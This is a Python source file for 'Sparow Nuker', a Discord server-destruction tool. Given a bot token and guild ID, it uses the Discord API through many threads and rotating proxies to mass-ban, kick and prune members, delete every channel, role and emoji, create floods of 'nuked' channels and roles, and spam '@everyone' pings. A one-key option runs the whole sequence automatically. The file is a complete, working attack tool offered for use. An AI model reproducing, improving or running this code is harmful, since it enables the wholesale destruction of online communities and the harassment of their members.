import threading, webbrowser, discord, random, httpx, json, time, os, asyncio; from discord.ext import commands;from itertools import cycle
from hexlogger import info, warning, error, success

VERSION = '1.0.0'
def load_config(auto=True):
    if not auto:
        os.system("cls" if os.name == "nt" else "clear")
        print("\x1b[38;5;122m[1] Automatic (config.json)\x1b[0m")
        print("\x1b[38;5;122m[2] Manual Input\x1b[0m")
        choice = input("\n\x1b[38;5;122m(Sparow) Choice: \x1b[0m")
        
        if choice == "2":
            token = input("\x1b[38;5;122m(Sparow) Token: \x1b[0m")
            return {
                "token": token,
                "proxy": False,
                "nuke": {
                    "channels_name": [],
                    "roles_name": [],
                    "messages_content": []
                }
            }
    
    try:
        return json.load(open("config.json", "r", encoding="utf-8"))
    except:
        return {"token": "", "proxy": False, "nuke": {"channels_name": ["nuked"], "roles_name": ["nuked"], "messages_content": ["@everyone nuked"]}}

if __name__ == "__main__":
    __config__ = load_config(auto=False)
else:
    __config__ = load_config(auto=True)
__proxies__, __client__, __threads__ = cycle(open("proxies.txt", "r").read().splitlines()), commands.Bot(command_prefix="+", help_command=None, intents=discord.Intents.all()), 45
Aizer = tuple(__config__["nuke"]["messages_content"])
chaizer = tuple(__config__["nuke"]["channels_name"])
roleizer = tuple(__config__["nuke"]["roles_name"])
token = __config__["token"]
os.system("cls" if os.name == "nt" else "clear")

Sparow_art = r"""
{c1}  ██████╗ ██╗    ██╗███╗   ██╗███████╗    ██╗   ██╗ ██████╗ ██╗   ██╗    ██╗
{c2} ██╔═══██╗██║    ██║████╗  ██║╚══███╔╝    ╚██╗ ██╔╝██╔═══██╗██║   ██║    ██║
{c3} ██║   ██║██║ █╗ ██║██╔██╗ ██║  ███╔╝      ╚████╔╝ ██║   ██║██║   ██║    ██║
{c4} ██║   ██║██║███╗██║██║╚██╗██║ ███╔╝        ╚██╔╝  ██║   ██║██║   ██║    ╚═╝
{c5} ╚██████╔╝╚███╔███╔╝██║ ╚████║███████╗       ██║   ╚██████╔╝╚██████╔╝    ██╗
{c6}  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝     ╚═╝{r}
                                                                           

""".format(
    c1="\x1b[38;5;55m", c2="\x1b[38;5;91m", c3="\x1b[38;5;92m", 
    c4="\x1b[38;5;93m", c5="\x1b[38;5;135m", c6="\x1b[38;5;141m", r="\x1b[0m"
)

options = r"""
{p}          ╚╦╗                                                             ╔╦╝
{p}     ╔═════╩══════════════════╦═════════════════════════╦══════════════════╩═════╗
{p}     ╩ {g}(1){p} {g}<{w} Ban Members      {p}║ {g}(5){p} {g}<{w} Create Roles      {p}║ {g}(9){p}  {g}<{w} Spam Channels   {p}╩
{p}       {g}(2){p} {g}<{w} Kick Members     {p}║ {g}(6){p} {g}<{w} Delete Channels   {p}║ {g}(10){p} {g}<{w} Check Updates      
{p}       {g}(3){p} {g}<{w} Prune Members    {p}║ {g}(7){p} {g}<{w} Delete Roles      {p}║ {g}(11){p} {g}<{w} Credits        
{p}     ╦ {g}(4){p} {g}<{w} Create Channels  {p}║ {g}(8){p} {g}<{w} Delete Emojis     {p}║ {g}(12){p} {g}<{w} Complete            {p}╦
{p}     ╚═════╦══════════════════╩═════════════════════════╩══════════════════╦═════╝
{p}          ╔╩╝                                                             ╚╩╗{r}
""".format(
    p="\x1b[38;5;141m",  g="\x1b[38;5;122m", w="\x1b[38;5;255m", r="\x1b[0m"
)


class Sparow:
    def __init__(self, log_callback=None):
        self.proxy = "http://" + next(__proxies__) if __config__["proxy"] == True else None
        self.session = httpx.Client(proxy=self.proxy)
        self.version = cycle(['v10', 'v9'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []
        self.log_callback = log_callback

    def log(self, message, level='info'):
        if self.log_callback:
            self.log_callback(message, level)
        else:
            if level == 'success': success(message)
            elif level == 'error': error(message)
            elif level == 'warning': warning(message)
            else: info(message)

 
    def execute_ban(self, guildid: str, member: str, token: str):
        payload = {
            "delete_message_days": random.randint(0, 7)
        }
        while True:
            response = self.session.put(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/bans/{member}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code in [200, 201, 204]:
                self.log(f"Banned {member}", 'success')
                self.banned.append(member)
                break
            elif "retry_after" in response.text:
                time.sleep(response.json()['retry_after'])
            elif "Missing Permissions" in response.text:
                warning(f"Missing Permissions {member}")
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                warning("You\'re being excluded from discord API")
                break
            elif "Max number of bans for non-guild members have been exceeded." in response.text:
                warning("Max number of bans for non-guild members have been exceeded")
                break
            else:
                error(f"Failed to ban {member}")
                break
            
    
    def execute_kick(self, guildid: str, member: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{member}", headers={"Authorization": f"Bot {token}"})
            if response.status_code in [200, 201, 204]:
                print("{}({}+{}) Kicked {}{}".format("\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", member))
                self.kicked.append(member)
                break
            elif "retry_after" in response.text:
                warning(f"Ratelimited. Delayed {response.json()['retry_after']}s")
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                warning(f"Missing Permissions {member}")
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                warning("You\'re being excluded from discord API")
                break
            else:
                self.log(f"Failed to kick {member}", 'error')
                break
            
    
    def execute_prune(self, guildid: str, days: int, token: str):
        payload = {
            "days": days
        }
        response = self.session.post(f"https://discord.com/api/v9/guilds/{guildid}/prune", headers={"Authorization": f"Bot {token}"}, json=payload)
        if response.status_code == 200:
            print("{}({}+{}) Pruned {}{}{} members".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", response.json()['pruned'], "\x1b[0m"))
        elif "Max number of prune requests has been reached. Try again later" in response.text:
            print("{}({}!{}) Max number of prune reached. Try again in {}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", response.json()['retry_after']))
        elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
            warning("You\'re being temporarly excluded from discord API")
        else:
            error(f"Failed to prune {guildid}")
            
            
    def execute_crechannels(self, guildid: str, channelsname: str, type: int, token: str):
        payload = {
            "type": type,
            "name": channelsname,
            "permission_overwrites": []
        }
        channelsname = channelsname.replace(" ", "-")
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 201:
                self.log(f"Created #{channelsname}", 'success')
                self.channels.append(1)
                break
            elif "retry_after" in response.text:
                warning(f"Ratelimited. Delayed {response.json()['retry_after']}s")
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}#{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channelsname))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                warning("You\'re being temporarly excluded from discord API")
                break
            else:
                error(f"Failed to create #{channelsname}")
                break
            
            
    def execute_creroles(self, guildid: str, rolesname: str, token: str):
        colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
        payload = {
            "name": rolesname,
            "color": colors
        }
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 200:
                self.log(f"Created @{rolesname}", 'success')
                self.roles.append(1)
                break
            elif "retry_after" in response.text:
                warning(f"Ratelimited. Delayed {response.json()['retry_after']}s")
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}@{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", rolesname))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                warning("You\'re being temporarly excluded from discord API")
                break
            else:
                error(f"Failed to create @{rolesname}")
                break
            
    
    def execute_delchannels(self, channel: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/channels/{channel}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 200:
                self.log(f"Deleted channel {channel}", 'success')
                self.channels.append(channel)
                break
            elif "retry_after" in response.text:
                warning(f"Ratelimited. Delayed {response.json()['retry_after']}s")
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                warning(f"Missing Permissions {channel}")
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                warning("You\'re being temporarly excluded from discord API")
                break
            else:
                error(f"Failed to delete {channel}")
                break
            
            
    def execute_delroles(self, guildid: str, role: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles/{role}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 204:
                self.log(f"Deleted role {role}", 'success')
                self.roles.append(role)
                break
            elif "retry_after" in response.text:
                warning(f"Ratelimited. Delayed {response.json()['retry_after']}s")
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                warning(f"Missing Permissions {role}")
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                warning("You\'re being temporarly excluded from discord API")
                break
            else:
                error(f"Failed to delete {role}")
                break
            
    def execute_delemojis(self, guildid: str, emoji: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/emojis/{emoji}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 204:
                self.log(f"Deleted emoji {emoji}", 'success')
                self.emojis.append(emoji)
                break
            elif "retry_after" in response.text:
                warning(f"Ratelimited. Delayed {response.json()['retry_after']}s")
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                warning(f"Missing Permissions {emoji}")
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                warning("You\'re being temporarly excluded from discord API")
                break
            else:
                error(f"Failed to delete {emoji}")
                break
            
    
    def execute_massping(self, channel: str, content: str, token: str):
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages", headers={"Authorization": f"Bot {token}"}, json={"content": content})
            if response.status_code == 200:
                self.log(f"Spammed {channel}", 'success')
                self.messages.append(channel)
                break
            elif "retry_after" in response.text:
                warning(f"Ratelimited. Delayed {response.json()['retry_after']}s")
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                warning(f"Missing Permissions {channel}")
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                warning("You\'re being temporarly excluded from discord API")
                break
            else:
                error(f"Failed to spam {channel}")
                break

    
    def menu(self):
        os.system(f"cls & title Sparow Nuker ^| Authenticated as: {__client__.user.name}#{__client__.user.discriminator}")
        print(Sparow_art + options + "\n")
        ans = input("{}({}Sparow{}) Option{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")) 
        
        if ans in ["1", "01"]:
            scrape = input("{}({}Sparow{}) Fetch IDs [Y/N]{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
            if scrape.lower() == "y":
                try:
                    guild = __client__.get_guild(int(guildid))
                    if guild is None:
                        headers = {"Authorization": f"Bot {token}"}
                        response = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers=headers)
                        if response.status_code == 200:
                            members_list = response.json()
                            with open("fetched/members.txt", "w") as a:
                                for member in members_list:
                                    a.write("{}{}".format(member['user']['id'], "\n"))
                            success(f"Successfully fetched {len(members_list)} members via API!")
                        else:
                            error(f"Guild not found & API fetch failed (Code: {response.status_code})!")
                    else:
                        members_list = guild.members
                        if len(members_list) <= 1:
                            headers = {"Authorization": f"Bot {token}"}
                            response = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers=headers)
                            if response.status_code == 200:
                                fetched_members = response.json()
                                with open("fetched/members.txt", "w") as a:
                                    for member in fetched_members:
                                        a.write("{}{}".format(member['user']['id'], "\n"))
                                success(f"Successfully fetched {len(fetched_members)} members via API fallback!")
                            else:
                                with open("fetched/members.txt", "w") as a:
                                    for member in members_list:
                                        a.write("{}{}".format(member.id, "\n"))
                                success(f"Successfully fetched {len(members_list)} members from cache!")
                        else:
                            with open("fetched/members.txt", "w") as a:
                                        for member in members_list:
                                            a.write("{}{}".format(member.id, "\n"))
                            success(f"Successfully fetched {len(members_list)} members!")
                except Exception as e:
                    error(f"Error fetching members: {e}")
            else:
                pass
            self.banned.clear()
            members = open("fetched/members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_ban, args=(guildid, member, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                    
            time.sleep(3)
            info(f"Banned {len(self.banned)}/{len(members)}")
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["2", "02"]:
            self.kicked.clear()
            members = open("fetched/members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_kick, args=(guildid, member, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            
            time.sleep(3)
            info(f"Kicked {len(self.kicked)}/{len(members)}")
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["3", "03"]:
            days = int(input("{}({}Sparow{}) Days{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            self.execute_prune(guildid, days, token)
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["4", "04"]:
            type = input("{}({}Sparow{}) Channels Type ['t', 'v']{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
            type = 2 if type == "v" else 0
            amount = int(input("{}({}Sparow{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            if chaizer:
                c_name = random.choice(chaizer)
            else:
                c_name = input("{}({}Sparow{}) Channel Name{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")).strip()
                if not c_name:
                    c_name = "nuked"
            self.channels.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_crechannels, args=(guildid, c_name, type, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            info(f"Created {len(self.channels)}/{amount} channels")
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["5", "05"]:
            amount = int(input("{}({}Sparow{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            if roleizer:
                r_name = random.choice(roleizer)
            else:
                r_name = input("{}({}Sparow{}) Role Name{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")).strip()
                if not r_name:
                    r_name = "nuked"
            self.roles.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_creroles, args=(guildid, r_name, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            info(f"Created {len(self.roles)}/{amount} roles")
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["6", "06"]:
            self.channels.clear()
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels:
                t = threading.Thread(target=self.execute_delchannels, args=(channel['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            info(f"Deleted {len(self.channels)}/{len(channels)} channels")
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["7", "07"]:
            self.roles.clear()
            roles = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}).json()
            for role in roles:
                t = threading.Thread(target=self.execute_delroles, args=(guildid, role['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            info(f"Deleted {len(self.roles)}/{len(roles)} roles")
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["8", "08"]:
            self.emojis.clear()
            emojis = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/emojis", headers={"Authorization": f"Bot {token}"}).json()
            for emoji in emojis:
                t = threading.Thread(target=self.execute_delemojis, args=(guildid, emoji['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                    
            time.sleep(3)
            info(f"Deleted {len(self.emojis)}/{len(emojis)} emojis")
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["9", "09"]:
            self.messages.clear(); self.channels.clear()
            amount = int(input("{}({}Sparow{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            if Aizer:
                m_content = random.choice(Aizer)
            else:
                m_content = input("{}({}Sparow{}) Message Content{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")).strip()
                if not m_content:
                    m_content = "@everyone nuked"
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels: self.channels.append(channel['id'])
            channelz = cycle(self.channels)
            for i in range(amount):
                t = threading.Thread(target=self.execute_massping, args=(next(channelz), m_content, token))
                t.start()
                while threading.active_count() >= __threads__ - 15:
                    t.join()
                    
            time.sleep(3)
            info(f"Spammed {len(self.messages)}/{amount} messages")
            time.sleep(1.5)
            self.menu()
            
        elif ans == "10":
            try:
                response = self.session.get("https://github.com/notAizer/Sparow-Nuker/releases/latest")
                check_version = response.headers.get('location').split('/')[7].split('v')[1]
                if VERSION != check_version:
                    warning("You\'re using an outdated version!")
                    webbrowser.open(f"https://github.com/notAizer/Sparow-Nuker/releases/tag/{check_version}")
                else:
                    success("You\'re using the current version!")
            except:
                error("Couldn\'t reach the releases!")
            
            time.sleep(1.5)
            self.menu()
    
        
        elif ans == "11":
            print("Developed By Nt development | Developed By Sparow  || Join :- Nt https://discord.gg/midontop || You-tube :-  https://youtube.com/@midontop")
            input("")
            self.menu()
        
        elif ans == "12":
            info("Starting full automatic completion...")
            time.sleep(1)

            info("[Step 1/4] Fetching IDs & Banning Members...")
            scrape = input("{}({}Sparow{}) Fetch IDs [Y/N]{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
            if scrape.lower() == "y":
                try:
                    guild = __client__.get_guild(int(guildid))
                    if guild is None:
                        headers = {"Authorization": f"Bot {token}"}
                        response = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers=headers)
                        if response.status_code == 200:
                            members_list = response.json()
                            with open("fetched/members.txt", "w") as a:
                                for member in members_list:
                                    a.write("{}{}".format(member['user']['id'], "\n"))
                            success(f"Successfully fetched {len(members_list)} members via API!")
                        else:
                            error(f"Guild not found & API fetch failed (Code: {response.status_code})!")
                    else:
                        members_list = guild.members
                        if len(members_list) <= 1:
                            headers = {"Authorization": f"Bot {token}"}
                            response = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers=headers)
                            if response.status_code == 200:
                                fetched_members = response.json()
                                with open("fetched/members.txt", "w") as a:
                                    for member in fetched_members:
                                        a.write("{}{}".format(member['user']['id'], "\n"))
                                success(f"Successfully fetched {len(fetched_members)} members via API fallback!")
                            else:
                                with open("fetched/members.txt", "w") as a:
                                    for member in members_list:
                                        a.write("{}{}".format(member.id, "\n"))
                                success(f"Successfully fetched {len(members_list)} members from cache!")
                        else:
                            with open("fetched/members.txt", "w") as a:
                                        for member in members_list:
                                            a.write("{}{}".format(member.id, "\n"))
                            success(f"Successfully fetched {len(members_list)} members!")
                except Exception as e:
                    error(f"Error fetching members: {e}")
            self.banned.clear()
            try:
                members = open("fetched/members.txt", "r").read().splitlines()
            except:
                members = []
                error("No members found to ban. Skipping ban step.")

            if members:
                for member in members:
                    t = threading.Thread(target=self.execute_ban, args=(guildid, member, token))
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                time.sleep(3)
                info(f"Banned {len(self.banned)}/{len(members)}")
            
            info("[Step 2/4] Deleting existing channels...")
            self.channels.clear()
            try:
                channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
                for channel in channels:
                    t = threading.Thread(target=self.execute_delchannels, args=(channel['id'], token))
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                time.sleep(3)
                info(f"Deleted {len(self.channels)}/{len(channels)} channels")
            except Exception as e:
                error(f"Failed to delete channels: {e}")

            info("[Step 3/4] Creating new channels...")
            type_choice = 0
            amount = 100
            if chaizer:
                c_name = random.choice(chaizer)
            else:
                c_name = "nuked"
            self.channels.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_crechannels, args=(guildid, c_name, type_choice, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            info(f"Created {len(self.channels)}/{amount} channels")

            info("[Step 4/4] Spamming/Mass-pinging channels...")
            if Aizer:
                m_content = random.choice(Aizer)
            else:
                m_content = "@everyone nuked sussesfully"
            self.messages.clear()
            self.channels.clear()
            try:
                channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
                for channel in channels:
                    self.channels.append(channel['id'])
                channelz = cycle(self.channels)
                spam_amount = 200
                for i in range(spam_amount):
                    t = threading.Thread(target=self.execute_massping, args=(next(channelz), m_content, token))
                    t.start()
                    while threading.active_count() >= __threads__ - 15:
                        t.join()
                time.sleep(3)
                info(f"Spammed {len(self.messages)}/{spam_amount} messages")
            except Exception as e:
                error(f"Failed to spam: {e}")

            success("COMPLETE!")
            time.sleep(3)
            self.menu()
            
    
@__client__.event
async def on_ready():
    success(f"Authenticated as: {__client__.user.name}#{__client__.user.discriminator}")
    await asyncio.sleep(1.5)
    threading.Thread(target=Sparow().menu, daemon=True).start()
    

if __name__ == "__main__":
    try:
        os.system("title NewGen Nuker ^| Authentication & mode con: cols=95 lines=25")
        guildid = input("{}({}Sparow{}) Guild ID{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
        __client__.run(token)
    except Exception as e:
        error(f"{e}")
        os._exit(0)
